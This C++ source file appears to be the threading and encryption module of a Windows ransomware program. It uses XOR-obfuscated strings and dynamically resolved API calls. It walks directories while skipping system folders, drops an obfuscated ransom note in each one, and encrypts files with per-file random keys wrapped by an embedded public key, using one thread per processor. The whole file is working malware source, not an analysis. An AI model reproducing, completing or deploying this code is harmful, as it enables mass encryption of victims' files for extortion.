#include "Threading.h"
THREAD_STRUCT threadStruct;
extern FARPROC APIArray[54];
MemelstrcmpA TemplstrcmpA;
MemeStrStrIA TempStrStrIA;
MemeCreateFileA TempCreateFileA2;
MemeWriteFile TempWriteFile2;
MemeCloseHandle TempCloseHandle2;
MemeFindFirstFileA TempFindFirstFileA;
MemeEnterCriticalSection TempEnterCriticalSection;
MemeLeaveCriticalSection TempLeaveCriticalSection;
MemeCryptGenRandom TempCryptGenRandom2;
MemeFindNextFileA TempFindNextFileA;
MemeFindClose TempFindClose;
MemeCryptAcquireContextA TempCryptAcquireContextA;
MemeCryptImportKey TempCryptImportKey;
MemeCryptReleaseContext TempCryptReleaseContext2;
MemeExitThread TempExitThread;
MemeGetNativeSystemInfo TempGetNativeSystemInfo;
MemeInitializeCriticalSection TempInitializeCriticalSection;
MemeCreateThread TempCreateThread;
MemeWaitForMultipleObjects TempWaitForMultipleObjects;
MemeDeleteCriticalSection TempDeleteCriticalSection;

void populateAPIThreading() {
	TemplstrcmpA = (MemelstrcmpA)APIArray[25];
	TempStrStrIA = (MemeStrStrIA)APIArray[51];
	TempCreateFileA2 = (MemeCreateFileA)APIArray[8];
	TempWriteFile2 = (MemeWriteFile)APIArray[9];
	TempCloseHandle2 = (MemeCloseHandle)APIArray[10];
	TempFindFirstFileA = (MemeFindFirstFileA)APIArray[26];
	TempEnterCriticalSection = (MemeEnterCriticalSection)APIArray[27];
	TempLeaveCriticalSection = (MemeLeaveCriticalSection)APIArray[28];
	TempCryptGenRandom2 = (MemeCryptGenRandom)APIArray[37];
	TempFindNextFileA = (MemeFindNextFileA)APIArray[29];
	TempFindClose = (MemeFindClose)APIArray[30];
	TempCryptAcquireContextA = (MemeCryptAcquireContextA)APIArray[42];
	TempCryptImportKey = (MemeCryptImportKey)APIArray[43];
	TempCryptReleaseContext2 = (MemeCryptReleaseContext)APIArray[41];
	TempExitThread = (MemeExitThread)APIArray[31];
	TempGetNativeSystemInfo = (MemeGetNativeSystemInfo)APIArray[32];
	TempInitializeCriticalSection = (MemeInitializeCriticalSection)APIArray[33];
	TempCreateThread = (MemeCreateThread)APIArray[34];
	TempWaitForMultipleObjects = (MemeWaitForMultipleObjects)APIArray[35];
	TempDeleteCriticalSection = (MemeDeleteCriticalSection)APIArray[36];
}

void resolveStringThreading(BYTE* buffer, BYTE* key, int size) {
	for (int i = 0; i < size; i++) {
		buffer[i] ^= 0xFF;
		buffer[i] ^= key[i % 5];
	}
}

int checkDirName(LPSTR directoryName) {
	if (!TemplstrcmpA) {
		populateAPIThreading();
	}
	BYTE avoid_dir_key[5] = { 226, 102, 86, 186, 145 };
	BYTE avoid_dir_str[137] = { 92, 233, 217, 1, 15, 105, 248, 169, 49, 3, 109, 153, 222, 44, 0, 115, 237, 169, 49, 11, 112, 233, 169, 49, 6, 104, 244, 203, 69, 74, 79, 252, 202, 60, 13, 113, 252, 135, 7, 7, 115, 153, 141, 23, 43, 94, 192, 234, 9, 43, 51, 219, 224, 11, 110, 78, 224, 218, 49, 11, 112, 185, 255, 42, 2, 104, 244, 204, 101, 39, 115, 255, 198, 55, 3, 124, 237, 192, 42, 0, 29, 219, 198, 42, 26, 29, 206, 192, 43, 10, 114, 238, 218, 69, 74, 74, 208, 231, 1, 33, 74, 202, 135, 59, 44, 73, 153, 254, 44, 0, 121, 246, 222, 54, 64, 114, 245, 205, 69, 62, 120, 235, 207, 9, 1, 122, 153, 228, 44, 13, 111, 246, 218, 42, 8, 105, 153 };
	resolveStringThreading(avoid_dir_str, avoid_dir_key, 137);

	BYTE* avoid_dir = avoid_dir_str;
	for (int i = 0; i < 14; i++) {
		if (!TemplstrcmpA(directoryName, (LPCSTR)avoid_dir)) {
			return -1;
		}
		avoid_dir += strlen((LPCSTR)avoid_dir) + 1;
	}
	return 0;
}

int checkFileName(LPSTR directoryName) {
	if (!TemplstrcmpA) {
		populateAPIThreading();
	}

	BYTE avoid_file_key[5] = { 73, 185, 196, 250, 118 };
	BYTE avoid_file_str[87] = { 152, 35, 67, 96, 137, 152, 34, 87, 105, 137, 152, 53, 66, 118, 137, 152, 43, 72, 108, 137, 152, 43, 78, 108, 137, 152, 47, 85, 99, 137, 152, 37, 90, 113, 137, 152, 36, 90, 113, 137, 152, 37, 86, 97, 137, 152, 54, 72, 52, 137, 152, 48,
	89, 118, 137, 152, 50, 79, 99, 137, 152, 32, 84, 107, 137, 152, 42, 85, 110, 137, 228, 3, 122, 65, 196, 243, 22, 119, 64, 200, 229, 3, 21, 81, 209, 226, 70 };
	resolveStringThreading(avoid_file_str, avoid_file_key, 87);
	BYTE* avoid_file = avoid_file_str;

	for (int i = 0; i < 15; i++) {
		if (TempStrStrIA(directoryName, (LPCSTR)avoid_file)) {
			return -1;
		}
		avoid_file += strlen((LPCSTR)avoid_file) + 1;
	}
	return 0;
}

void dropRansomNote(LPSTR directoryName) {
	if (!TemplstrcmpA) {
		populateAPIThreading();
	}

	BYTE ransomeNote_key[5] = { 235, 194, 77, 227, 234 };
	BYTE ransomeNote_str[17] = { 70, 120, 243, 88, 88, 81, 109, 254, 89, 84, 71, 120, 156, 72, 77, 64, 61 };
	resolveStringThreading(ransomeNote_str, ransomeNote_key, 17);

	LPSTR fileName = (LPSTR)calloc(strlen(directoryName) + strlen((LPCSTR)ransomeNote_str) + 1, 1);
	if (!fileName) {
		return;
	}

	strncpy(fileName, directoryName, strlen(directoryName) - 1);
	strcat(fileName, (LPCSTR)ransomeNote_str);

	HANDLE ransomNote = TempCreateFileA2(fileName, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

	if (ransomNote == INVALID_HANDLE_VALUE) {
		free(fileName);
		return;
	}

	BYTE ransomNoteContent_key[5] = { 147, 76, 245, 200, 156 };
	BYTE ransomNoteContent_str[511] = { 53, 242, 42, 110, 38, 41, 231, 43, 22, 105, 102, 234, 101, 66, 67, 4, 210, 124, 82, 67, 3, 213, 108, 94, 0, 5, 210, 102, 91, 26, 76, 209, 111, 82, 13, 76, 222, 111, 90, 6, 8, 147, 104, 78, 67, 33, 214, 103, 82, 32, 30, 202, 122, 67, 12, 30, 147, 88, 86, 13, 31, 220, 103, 64, 2, 30, 214, 43, 61, 105, 45, 223, 102, 23, 26, 3, 198, 120, 23, 5, 5, 223, 111, 68, 67, 13, 193, 111, 23, 13, 3, 196, 42, 82, 13, 15, 193, 115, 71, 23, 9, 215, 42, 86, 13, 8, 147, 111, 90, 1, 9, 215, 110, 82, 7, 76, 218, 100, 68, 10, 8, 214, 42, 86, 13, 76, 218, 103, 86, 4, 9, 147, 108, 88, 17, 1, 210, 126, 25, 105, 37, 213, 42, 78, 12, 25, 147, 126, 69, 26, 76, 199, 101, 23, 22, 31, 214, 42, 86, 13, 21, 147, 120, 82, 0, 3, 197, 111, 69, 26, 76, 192, 101, 81, 23, 27, 210, 120, 82, 67, 3, 198, 126, 95, 6, 30, 214, 38, 23, 23, 4, 214, 42, 81, 10, 0, 214, 121, 23, 0, 13, 221, 42, 71, 12, 24, 214, 100, 67, 10, 13, 223, 102, 78, 67, 14, 214, 42, 83, 2, 1, 210, 109, 82, 7, 76, 210, 100, 83, 67, 25, 221, 120, 82, 23, 30, 218, 111, 65, 2, 14, 223, 111, 25, 77, 66, 185, 0, 125, 22, 31, 199, 42, 92, 10, 8, 215, 99, 89, 4, 77, 147, 67, 23, 11, 13, 197, 111, 23, 10, 2, 208, 102, 66, 7, 9, 215, 42, 90, 26, 76, 215, 111, 84, 17, 21, 195, 126, 94, 13, 11, 147, 121, 88, 5, 24, 196, 107, 69, 6, 76, 220, 100, 23, 23, 4, 214, 42, 80, 10, 24, 219, 127, 85, 67, 30, 214, 122, 88, 79, 102, 192, 101, 23, 26, 3, 198, 42, 84, 2, 2, 147, 110, 88, 20, 2, 223, 101, 86, 7, 76, 210, 100, 83, 67, 8, 214, 105, 69, 26, 28, 199, 42, 78, 12, 25, 193, 42, 68, 23, 25, 213, 108,
	22, 66, 102, 185, 39, 26, 78, 65, 158, 39, 26, 78, 65, 158, 39, 26, 78, 65, 158, 39, 26, 78, 65, 158, 39, 26, 78, 65, 158, 39, 26, 78, 65, 158, 39, 26, 78, 65, 158, 39, 26, 78, 65, 158, 39, 26, 78, 65, 158, 39, 26, 78, 65, 158, 39, 26, 78, 65, 158, 39, 26, 105,
	102, 245, 111, 82, 15, 76, 213, 120, 82, 6, 76, 199, 101, 23, 0, 3, 221, 126, 86, 0, 24, 147, 103, 82, 67, 3, 221, 42, 99, 20, 5, 199, 126, 82, 17, 76, 243, 105, 103, 6, 24, 214, 120, 69, 67, 24, 220, 42, 71, 17, 3, 197, 99, 83, 6, 76, 210, 100, 78, 67, 10, 214, 111, 83, 1, 13, 208, 97, 22, 105, 102, 231, 98, 86, 13, 7, 192, 38, 61, 51, 9, 199, 111, 69, 105, 108 };
	resolveStringThreading(ransomNoteContent_str, ransomNoteContent_key, 511);

	TempWriteFile2(ransomNote, ransomNoteContent_str, strlen((LPCSTR)ransomNoteContent_str), NULL, NULL);
	TempCloseHandle2(ransomNote);
	free(fileName);
}

int mainThreadEncryption(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPSTR directoryName, THREAD_STRUCT* pThreadStruct) {
	if (!TemplstrcmpA) {
		populateAPIThreading();
	}
	HANDLE hSearchHandle = NULL;
	WIN32_FIND_DATAA findFileData = WIN32_FIND_DATAA();
	LPSTR fileName = NULL;
	int returnValue = -1;
	BYTE* key = NULL;
	BYTE* nonce = NULL;
	hSearchHandle = TempFindFirstFileA(directoryName, &findFileData);

	if (hSearchHandle == INVALID_HANDLE_VALUE) {
		goto CLEANUP;
	}
	dropRansomNote(directoryName);
	do {

		BYTE Microsoft_key[5] = { 41, 7, 216, 231, 100 };
		BYTE Microsoft_str[10] = { 155, 145, 68, 106, 244, 165, 151, 65, 108, 155 };
		resolveStringThreading(Microsoft_str, Microsoft_key, 10);

		if (TempStrStrIA(findFileData.cFileName, (LPCSTR)Microsoft_str)) {
			continue;
		}

		BYTE curr_key[5] = { 10, 95, 83, 22, 220 };
		BYTE curr_str[2] = { 219, 160 };
		resolveStringThreading(curr_str, curr_key, 2);

		if (TemplstrcmpA(findFileData.cFileName, (LPCSTR)curr_str)) {

			BYTE parent_dir_key[5] = { 158, 38, 8, 194, 240 };
			BYTE parent_dir_str[3] = { 79, 247, 247 };
			resolveStringThreading(parent_dir_str, parent_dir_key, 3);

			if (TemplstrcmpA(findFileData.cFileName, (LPCSTR)parent_dir_str)) {
				if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)) {
					if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
						if (findFileData.cFileName[0] == '.') {
							continue;
						}
						if (checkDirName(findFileData.cFileName) == -1) {
							continue;
						}
						BYTE key[5] = { 85, 169, 100, 147, 87 };
						BYTE str[3] = { 246, 124, 155 };
						resolveStringThreading(str, key, 3);
						LPSTR fileName = (LPSTR)calloc(strlen(directoryName) + strlen(findFileData.cFileName) + strlen((LPCSTR)str), 1);
						if (!fileName) {
							continue;
						}

						strncpy(fileName, directoryName, strlen(directoryName) - 1);
						strcat(fileName, findFileData.cFileName);
						strcat(fileName, (LPCSTR)str);
						TempEnterCriticalSection(&pThreadStruct->threadCriticalSection);
						addNode(pThreadStruct, fileName);
						TempLeaveCriticalSection(&pThreadStruct->threadCriticalSection);
					}
					else {
						if (checkFileName(findFileData.cFileName) == -1) {
							continue;
						}
						LPSTR fileName = (LPSTR)calloc(strlen(directoryName) + strlen(findFileData.cFileName) + 1, 1);
						if (!fileName) {
							continue;
						}
						strncpy(fileName, directoryName, strlen(directoryName) - 1);
						strcat(fileName, findFileData.cFileName);

						key = (BYTE*)calloc(256, 1);

						if (!key) {
							free(fileName);
							continue;
						}

						nonce = (BYTE*)calloc(8, 1);

						if (!nonce) {
							free(fileName);
							free(key);
							continue;
						}

						if (!TempCryptGenRandom2(hCryptProv, 256, key)) {
							free(fileName);
							free(key);
							free(nonce);
							continue;
						}

						if (!TempCryptGenRandom2(hCryptProv, 8, nonce)) {
							free(fileName);
							free(key);
							free(nonce);
							continue;
						}
						fileEncrypt(hCryptProv, publicKey, fileName, key, nonce);
						free(fileName);
						free(key);
						free(nonce);
					}
				}
			}
		}
	} while (TempFindNextFileA(hSearchHandle, &findFileData) != 0);

	returnValue = 0;
CLEANUP:
	if (hSearchHandle) {
		TempFindClose(hSearchHandle);
	}
	return returnValue;
}

int acquireContext(HCRYPTPROV* phCryptProv) {
	if (!TemplstrcmpA) {
		populateAPIThreading();
	}

	BYTE provider_key[5] = { 144, 151, 88, 61, 58 };
	BYTE provider_str[54] = { 34, 1, 196, 176, 170, 28, 7, 193, 182, 229, 42, 6, 207, 163, 171, 12, 13, 195, 226, 151, 60, 41, 135, 163, 171, 11, 72, 230, 135, 150, 79, 43, 213, 187, 181, 27, 7, 192, 176, 164, 31, 0, 206,
	161, 229, 63, 26, 200, 180, 172, 11, 13, 213, 194 };
	resolveStringThreading(provider_str, provider_key, 54);

	if (TempCryptAcquireContextA(phCryptProv, 0, (LPCSTR)provider_str, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return 0;
	}
	if (TempCryptAcquireContextA(phCryptProv, 0, (LPCSTR)provider_str, PROV_RSA_AES, 0xF0000008)) {
		return 0;
	}

	BYTE prototype_key[5] = { 115, 178, 62, 119, 239 };
	BYTE prototype_str[66] = { 193, 36, 162, 250, 127, 255, 34, 167, 252, 48, 201, 35, 169, 233, 126, 239, 40, 165, 168, 66, 223, 12, 225, 233, 126, 232, 109, 128, 205, 67, 172,
							 14, 179, 241, 96, 248, 34, 166, 250, 113, 252, 37, 168, 235, 48, 220, 63, 174, 254, 121, 232, 40, 179, 168, 56, 220, 63, 174, 252, 127, 248, 52, 177, 237, 57, 140 };
	resolveStringThreading(prototype_str, prototype_key, 66);

	if (TempCryptAcquireContextA(phCryptProv, 0, (LPCSTR)prototype_str, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return 0;
	}
	if (TempCryptAcquireContextA(phCryptProv, 0, (LPCSTR)prototype_str, PROV_RSA_AES, 0xF0000008)) {
		return 0;
	}
	return -1;
}

void threadEncrypt(THREAD_STRUCT* pThreadStruct) {
	if (!TemplstrcmpA) {
		populateAPIThreading();
	}
	HCRYPTPROV hCryptProv;
	HCRYPTKEY publicKey;
	int returnVal = -1;
	int threadID = -1;

	if (acquireContext(&hCryptProv) == -1) {
		goto CLEANUP;
	}

	if (TempCryptImportKey(hCryptProv, publicKeyBlob, 532, 0, 0, &publicKey) == FALSE) {
		goto CLEANUP;
	}

	while (TRUE) {
		LL_NODE* curr = NULL;
		int counter = 0;
		while (TRUE) {
			if (counter == 2) {
				goto CLEANUP;
			}
			TempEnterCriticalSection(&pThreadStruct->threadCriticalSection);
			if (pThreadStruct->head) {
				curr = popNode(pThreadStruct);
				break;
			}
			TempLeaveCriticalSection(&pThreadStruct->threadCriticalSection);
			counter++;
		}

		if (!curr) {
			continue;
		}

		LPSTR dirName = (LPSTR)calloc(strlen(curr->dirName) + 1, 1);
		if (!dirName) {
			continue;
		}
		strcpy(dirName, curr->dirName);
		freeNode(curr);

		TempLeaveCriticalSection(&pThreadStruct->threadCriticalSection);

		mainThreadEncryption(hCryptProv, publicKey, dirName, pThreadStruct);

		if (dirName) {
			free(dirName);
		}
	}

CLEANUP:
	if (hCryptProv) {
		TempCryptReleaseContext2(hCryptProv, 0);
	}
	TempExitThread(returnVal);
}

int initThreadStruct() {
	if (!TemplstrcmpA) {
		populateAPIThreading();
	}

	THREAD_STRUCT* pThreadStruct = &threadStruct;

	SYSTEM_INFO systemInfo = SYSTEM_INFO();

	TempGetNativeSystemInfo(&systemInfo);

	pThreadStruct->threadCount = systemInfo.dwNumberOfProcessors;

	HANDLE* buffer = (HANDLE*)calloc(4 * pThreadStruct->threadCount, 1);
	if (!buffer) {
		return -1;
	}
	TempInitializeCriticalSection(&pThreadStruct->threadCriticalSection);

	pThreadStruct->threadArray = buffer;
	return 0;
}

void launchThreadEncrypt(LPSTR drivePath) {
	if (!TemplstrcmpA) {
		populateAPIThreading();
	}
	THREAD_STRUCT* pThreadStruct = &threadStruct;
	LPSTR firstDir = (LPSTR)(calloc(strlen(drivePath) + 3, 1));
	if (!firstDir) {
		return;
	}
	strcpy(firstDir, drivePath);

	BYTE key[5] = { 254, 22, 109, 104, 48 };
	BYTE str[3] = { 93, 195, 146 };
	resolveStringThreading(str, key, 3);

	strcat(firstDir, (LPCSTR)str);

	addNode(pThreadStruct, firstDir);
	for (int i = 0; i < pThreadStruct->threadCount; i++) {
		pThreadStruct->threadArray[i] = TempCreateThread(0, 0, (LPTHREAD_START_ROUTINE)threadEncrypt, pThreadStruct, 0, 0);
		if (pThreadStruct->threadArray[i] == 0 || pThreadStruct->threadArray[i] == INVALID_HANDLE_VALUE) {
			continue;
		}
	}
}

void cleanUpThread() {
	if (!TemplstrcmpA) {
		populateAPIThreading();
	}
	THREAD_STRUCT* pThreadStruct = &threadStruct;

	TempWaitForMultipleObjects(pThreadStruct->threadCount, pThreadStruct->threadArray, TRUE, INFINITE);
	TempDeleteCriticalSection(&pThreadStruct->threadCriticalSection);
	if (pThreadStruct->threadArray) {
		for (int i = 0; i < pThreadStruct->threadCount; i++) {
			if (pThreadStruct->threadArray[i]) {
				TempCloseHandle2(pThreadStruct->threadArray[i]);
			}
		}
		free(pThreadStruct->threadArray);
	}
}

void freeNode(LL_NODE* node) {
	if (!TemplstrcmpA) {
		populateAPIThreading();
	}
	if (node) {
		if (node->dirName) {
			free(node->dirName);
		}
		free(node);
	}
}

LL_NODE* popNode(THREAD_STRUCT* pThreadStruct) {
	if (pThreadStruct->head) {
		LL_NODE* result = pThreadStruct->head;
		pThreadStruct->head = result->nextNode;
		return result;
	}
	return NULL;

}

int addNode(THREAD_STRUCT* pThreadStruct, LPSTR name) {
	LL_NODE* node = newNode();
	if (!node) {
		return -1;
	}
	if (pThreadStruct->head == NULL) {
		pThreadStruct->head = node;
		pThreadStruct->tail = pThreadStruct->head;
		pThreadStruct->tail->dirName = name;
	}
	else {
		pThreadStruct->tail->nextNode = node;
		pThreadStruct->tail = pThreadStruct->tail->nextNode;
		pThreadStruct->tail->dirName = name;
	}
	return 0;
}

LL_NODE* newNode() {
	LL_NODE* node = (LL_NODE*)calloc(sizeof(LL_NODE), 1);
	if (!node) {
		return NULL;
	}
	node->dirName = NULL;
	node->nextNode = NULL;
	return node;
}